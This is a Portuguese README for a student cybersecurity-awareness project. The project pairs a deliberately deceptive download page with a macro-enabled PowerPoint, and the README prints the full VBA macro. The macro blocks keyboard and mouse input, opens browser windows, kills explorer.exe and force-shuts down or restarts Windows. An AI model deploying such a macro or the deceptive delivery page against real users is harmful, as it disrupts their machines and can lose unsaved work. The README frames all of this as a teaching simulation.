

[![GitHub Pages](https://img.shields.io/badge/GitHub-Pages-327FC7?style=flat-square&logo=github)](https://d3z33.github.io/fontesenai/)
[![HTML5](https://img.shields.io/badge/HTML5-E34F26?style=flat-square&logo=html5&logoColor=white)](https://developer.mozilla.org/en-US/docs/Web/HTML)
[![CSS3](https://img.shields.io/badge/CSS3-1572B6?style=flat-square&logo=css3&logoColor=white)](https://developer.mozilla.org/en-US/docs/Web/CSS)
[![JavaScript](https://img.shields.io/badge/JavaScript-F7DF1E?style=flat-square&logo=javascript&logoColor=black)](https://developer.mozilla.org/en-US/docs/Web/JavaScript)

## Visão Geral

Este projeto faz parte de um curso voltado para os Princípios de Cibersegurança, cujo objetivo é demonstrar cenários simulados de ataques cibernéticos, além de realizar exercícios práticos utilizando tecnologias como HTML, CSS, JavaScript e VBA Macros no PowerPoint. O projeto aborda questões como segurança digital, ameaças online e conscientização dos participantes sobre os riscos presentes na internet.

## 🚀 Acesse o Projeto

Você pode acessar a página do projeto clicando no botão abaixo:

[![Clique aqui para abrir a página do projeto](https://img.shields.io/badge/Abrir-Projeto-2D8CFF?style=for-the-badge)](https://d3z33.github.io/fontesenai/)


## 🌐 Funcionamento do Site

- **Página Inicial:**

O site foi criado para ser interativo e educacional. Ao acessar a página, o usuário é recebido com um botão principal: “Clique aqui para o Download do Arquivo”.


- **Interação do Usuário:**

Ao clicar no botão principal, o botão desaparece em forma de fumaça e é substituído por vários outros botões dispostos de maneira aleatória.

- **Enganação Intencional:** 

Esses novos botões parecem oferecer a opção de download, mas ao tentar clicar neles, eles se movem rapidamente de forma aleatória para impedir que o usuário os clique. Isso foi feito para simular uma experiência de ataque frustrante ou enganosa, comum em cenários de engenharia social.


- **Acesso ao Arquivo:**

Somente um dos botões está fixo de forma minúscula e fornece o download do arquivo real, que é um arquivo PowerPoint (.pptm) contendo uma macro VBA que realiza simulações.

O botão de download real foi propositalmente disfarçado, colocado no canto inferior da tela e minimizado para dificultar sua localização.

Importante: Para acessar o conteúdo da simulação, o usuário deve baixar o arquivo PowerPoint e autorizar a execução das macros.


## 🛠️ Tecnologias Utilizadas

Este projeto foi desenvolvido com as seguintes tecnologias:

- **HTML5**: A estrutura da página foi criada utilizando HTML5, a última versão da linguagem de marcação padrão para a criação de páginas web.

- **CSS3**: O layout e o estilo visual foram implementados com CSS3, permitindo uma personalização sofisticada e responsiva.
  
- **JavaScript**: A lógica interativa e os efeitos dinâmicos foram programados em JavaScript, proporcionando uma experiência de usuário avançada e imersiva.
  
- **VBA Macros**: Utilizado no PowerPoint para criar uma simulação de ataque.
  

## 📂 Estrutura do Projeto

A estrutura de diretórios do projeto é organizada da seguinte forma:

```bash
fontesenai/
├── index.html         # Página principal do projeto
├── styles.css         # Arquivo de estilos CSS
├── script.js          # Script JavaScript para a interação
├── README.md          # Documentação do projeto
└── assets/            # Arquivos de mídia, imagens e ícones utilizados
    ├── 0.jpeg
    ├── 1.jpeg
    ├── 2.jpeg
    ├── 3.jpeg
    ├── 4.jpeg
    ├── 5.jpeg
    └── Apresentasao-Ciber.pptm  # Arquivo PowerPoint usado na simulação
```
## 📜 Instruções para Execução do PowerPoint

- **Ambiente Controlado**

**Acessar a Página:** [Aqui](https://d3z33.github.io/fontesenai/) para abrir a página do projeto.

O arquivo PowerPoint contém macros VBA que simulam um ataque cibernético. É recomendado que o teste seja realizado em um ambiente controlado.

**Habilitar Macros**:

Após o download, o PowerPoint solicitará que você habilite as macros. É necessário adicionar a pasta onde o arquivo foi salvo como local confiável, caso contrário, as macros não serão executadas.
Execução da Macro:

A partir do slide 3 do arquivo PowerPoint, qualquer clique no slide aciona a macro. Isso simula um ataque, causando uma série de ações no sistema, como o movimento descontrolado do mouse, desativação do teclado, abertura de janelas e, por fim, a reinicialização ou desligamento do computador.

## 🎯 Objetivo do Projeto**

O objetivo deste projeto é educar e conscientizar os participantes sobre os riscos de segurança na internet. A simulação de um ataque mostra como um cenário realista pode ser perigoso e ilustra a importância da cibersegurança.

## 💻 Código da Macro (VBA) no PowerPoint

Abaixo está o código da macro VBA que simula o ataque:

```bash
' Importa as funções da biblioteca "user32" para mover o cursor do mouse
Declare PtrSafe Function SetCursorPos Lib "user32" (ByVal x As Long, ByVal y As Long) As Long

' Importa a função "Sleep" da biblioteca "kernel32" para adicionar um atraso em milissegundos
Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)

' Importa a função "BlockInput" da biblioteca "user32" para bloquear as entradas do teclado e mouse
Declare PtrSafe Function BlockInput Lib "user32" (ByVal fBlockIt As Long) As Long

' Importa a função "GetSystemMetrics" da biblioteca "user32" para obter as dimensões da tela
Declare PtrSafe Function GetSystemMetrics Lib "user32" (ByVal nIndex As Long) As Long

' Importa a função "ShellExecute" da biblioteca "shell32.dll" para executar arquivos ou abrir URLs
Declare PtrSafe Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" ( _
    ByVal hwnd As Long, _
    ByVal lpOperation As String, _
    ByVal lpFile As String, _
    ByVal lpParameters As String, _
    ByVal lpDirectory As String, _
    ByVal nShowCmd As Long) As Long

' Sub rotina principal que simula o ataque
Sub ExecutarSimulacao()

    ' Bloqueia o teclado e o mouse para impedir interações
    BlockInput True

    ' Faz o cursor do mouse se mover de forma descontrolada em um padrão circular
    Dim i As Long
    For i = 1 To 1000

        ' Calcula a posição do mouse baseada no cosseno e seno para criar o movimento circular
        SetCursorPos (GetSystemMetrics(0) / 2) + 50 * Cos(i), (GetSystemMetrics(1) / 2) + 50 * Sin(i)

        ' Pausa de 1 milissegundo entre cada movimento do mouse para criar fluidez
        Sleep 1
    Next i

    ' URLs das imagens que serão abertas em novas janelas do Chrome
    Dim urls As Variant
    Dim j As Integer
    urls = Array("https://raw.githubusercontent.com/D3Z33/fontesenai/main/assets/5.jpeg", _
                 "https://raw.githubusercontent.com/D3Z33/fontesenai/main/assets/4.jpeg", _
                 "https://raw.githubusercontent.com/D3Z33/fontesenai/main/assets/3.jpeg", _
                 "https://raw.githubusercontent.com/D3Z33/fontesenai/main/assets/2.jpeg", _
                 "https://raw.githubusercontent.com/D3Z33/fontesenai/main/assets/1.jpeg", _
                 "https://raw.githubusercontent.com/D3Z33/fontesenai/main/assets/0.jpeg")

    ' Abre cada URL em uma nova janela do Chrome, com um pequeno atraso entre cada uma
    For j = 0 To UBound(urls)

        ' Abre o Chrome em uma nova janela maximizada com a URL correspondente
        ShellExecute 0, "open", "chrome.exe", "--start-maximized --new-window " & urls(j), vbNullString, vbNormalFocus

        ' Pausa de 1200 milissegundos (1,2 segundos) entre a abertura de cada aba
        Sleep 1200
    Next j

    ' Pausa de 1,2 segundos antes de fechar o explorador de arquivos
    Sleep 1200

    ' Fecha o explorador de arquivos do Windows para simular um impacto maior no sistema
    Shell "taskkill /f /im explorer.exe", vbHide

    ' Escolhe aleatoriamente entre desligar ou reiniciar o sistema
    Randomize

    If Rnd < 0.5 Then
        ' Desliga o sistema imediatamente
        Shell "shutdown -s -f -t 0", vbHide  ' Desligar
    Else
        ' Reinicia o sistema imediatamente
        Shell "shutdown -r -f -t 0", vbHide  ' Reiniciar
    End If
End Sub
```

## 🛠️ Instruções Gerais

- **Execução Manual Não Recomendada:**
   A simulação é programada para ser automática. Caso as macros não sejam executadas corretamente, a simulação não terá efeito.

- **Ambiente Seguro:**
Para evitar problemas, execute este teste em um ambiente seguro ou em máquinas virtuais.

- **Desempenho do Sistema:**
Durante a execução da macro, o sistema pode sofrer impacto no desempenho, como fechamento de aplicações e reinicialização do sistema.


### Explicações:

- **Ícones de Tecnologias**: Usei ícones para HTML5, CSS3, e JavaScript, que são as tecnologias principais usadas neste projeto.

- **Botão de Acesso**: Um botão grande e claro que leva diretamente à página do projeto.

- **Estrutura do Projeto**: Descrição da estrutura de diretórios para facilitar a compreensão do projeto.

- **Objetivo e Instruções**: Uma seção clara sobre o propósito do projeto e como utilizá-lo.

## ⌨️ com ❤️ por [D3Z33] 🧑‍💻 🎓
